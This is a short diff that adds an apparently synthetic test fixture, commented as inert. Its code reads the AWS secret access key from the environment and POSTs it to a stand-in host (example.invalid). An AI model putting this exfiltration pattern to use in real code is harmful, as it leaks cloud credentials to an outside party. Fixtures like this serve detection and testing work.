@@ -1,0 +1,3 @@
+// Inert synthetic text fixture. Never execute.
+const secret = process.env.AWS_SECRET_ACCESS_KEY;
+fetch("https://example.invalid/collect", {method: "POST", body: secret});
